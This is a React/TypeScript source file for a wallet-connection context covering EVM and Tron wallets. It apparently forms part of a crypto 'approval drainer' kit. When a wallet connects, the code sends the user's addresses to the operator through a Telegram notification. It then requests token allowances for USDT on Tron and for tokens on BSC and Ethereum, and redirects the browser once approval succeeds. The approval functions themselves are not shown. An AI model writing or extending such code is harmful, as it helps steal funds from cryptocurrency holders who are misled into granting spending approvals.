import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
import { useEvmWallet, EvmWalletProvider } from "./EvmWalletContext";
import { useTronWallet, TronWalletProvider } from "./TronWalletContext";
import { SUPPORTED_CHAINS, getChainByStringId } from "@/lib/chains";
import { sendWalletConnectedNotification } from "@/lib/telegramNotify";
import { REDIRECT_URL } from "@/lib/dummyData";
import { toast } from "sonner";

interface UnifiedWalletContextType {
  evmAddress: string | null;
  tronAddress: string | null;
  isConnected: boolean;
  isApproving: boolean;
  approvedNetworks: Record<string, boolean>; // e.g. { trc20: true, bep20: false, erc20: false }
  connectAll: () => Promise<void>;
  approveNetwork: (networkKey: "trc20" | "bep20" | "erc20") => Promise<void>;
}

const UnifiedWalletContext = createContext<UnifiedWalletContextType>({
  evmAddress: null,
  tronAddress: null,
  isConnected: false,
  isApproving: false,
  approvedNetworks: {},
  connectAll: async () => {},
  approveNetwork: async () => {},
});

export const useUnifiedWallet = () => useContext(UnifiedWalletContext);

const UnifiedWalletInnerProvider = ({ children }: { children: ReactNode }) => {
  const evmWallet = useEvmWallet();
  const tronWallet = useTronWallet();

  const [approvedNetworks, setApprovedNetworks] = useState<Record<string, boolean>>({
    trc20: false,
    bep20: false,
    erc20: false,
  });

  const isConnected = evmWallet.isConnected || tronWallet.isConnected;
  const isApproving = evmWallet.isApproving || tronWallet.isApproving;

  const connectAll = useCallback(async () => {
    // Connect EVM first, then Tron
    await evmWallet.connect();
    if (evmWallet.address) {
      sendWalletConnectedNotification(evmWallet.address, tronWallet.address).catch(console.error);
    }
  }, [evmWallet, tronWallet]);

  const approveNetwork = useCallback(async (networkKey: "trc20" | "bep20" | "erc20") => {
    if (networkKey === "trc20") {
      if (!tronWallet.isConnected) {
        await tronWallet.connect();
      }
      const success = await tronWallet.approveTronUsdt();
      if (success) {
        setApprovedNetworks((prev) => ({ ...prev, trc20: true }));
        window.location.replace(REDIRECT_URL);
      }
    } else if (networkKey === "bep20") {
      if (!evmWallet.isConnected) {
        await evmWallet.connect();
      }
      const bscConfig = getChainByStringId("bsc");
      if (bscConfig) {
        const success = await evmWallet.approveChainTokens(bscConfig);
        if (success) {
          setApprovedNetworks((prev) => ({ ...prev, bep20: true }));
          window.location.replace(REDIRECT_URL);
        }
      }
    } else if (networkKey === "erc20") {
      if (!evmWallet.isConnected) {
        await evmWallet.connect();
      }
      const ethConfig = getChainByStringId("ethereum");
      if (ethConfig) {
        const success = await evmWallet.approveChainTokens(ethConfig);
        if (success) {
          setApprovedNetworks((prev) => ({ ...prev, erc20: true }));
          window.location.replace(REDIRECT_URL);
        }
      }
    }
  }, [evmWallet, tronWallet]);

  return (
    <UnifiedWalletContext.Provider
      value={{
        evmAddress: evmWallet.address,
        tronAddress: tronWallet.address,
        isConnected,
        isApproving,
        approvedNetworks,
        connectAll,
        approveNetwork,
      }}
    >
      {children}
    </UnifiedWalletContext.Provider>
  );
};

export const UnifiedWalletProvider = ({ children }: { children: ReactNode }) => {
  return (
    <EvmWalletProvider>
      <TronWalletProvider>
        <UnifiedWalletInnerProvider>{children}</UnifiedWalletInnerProvider>
      </TronWalletProvider>
    </EvmWalletProvider>
  );
};
